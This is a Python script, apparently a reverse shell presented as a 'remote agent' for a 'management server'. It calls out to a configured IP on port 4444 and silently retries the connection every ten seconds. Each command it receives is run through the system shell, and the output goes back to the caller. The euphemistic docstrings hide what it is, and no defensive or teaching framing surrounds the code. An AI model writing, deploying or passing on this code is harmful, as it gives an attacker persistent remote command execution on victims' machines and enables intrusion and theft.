import socket
import subprocess
import os
import sys
import time

class RemoteAgent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
        
    def establish_connection(self):
        """Create a connection to the management server"""
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.host, self.port))
                return True
            except:
                time.sleep(10)  # Retry every 10 seconds
                
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            if command.lower().startswith("cd "):
                os.chdir(command[3:].strip())
                return f"Changed directory to: {os.getcwd()}"
            
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE
            )
            output, error = process.communicate()
            return output.decode() + error.decode()
        except Exception as e:
            return f"Error: {str(e)}"
    
    def run(self):
        """Main operation loop"""
        while True:
            if not self.connection:
                if not self.establish_connection():
                    continue
            
            try:
                command = self.connection.recv(4096).decode('utf-8').strip()
                
                if not command:
                    continue
                    
                if command.lower() == "exit":
                    self.connection.close()
                    break
                    
                if command.lower() == "reconnect":
                    self.connection.close()
                    self.connection = None
                    continue
                
                result = self.execute_command(command)
                
                if not result:
                    result = "Command executed successfully"
                    
                self.connection.send(result.encode('utf-8'))
                
            except Exception as e:
                self.connection = None
                time.sleep(5)

if __name__ == "__main__":
    # Configuration
    SERVER_HOST = "192.168.1.100"  # Change to your server IP
    SERVER_PORT = 4444
    
    agent = RemoteAgent(SERVER_HOST, SERVER_PORT)
    agent.run()
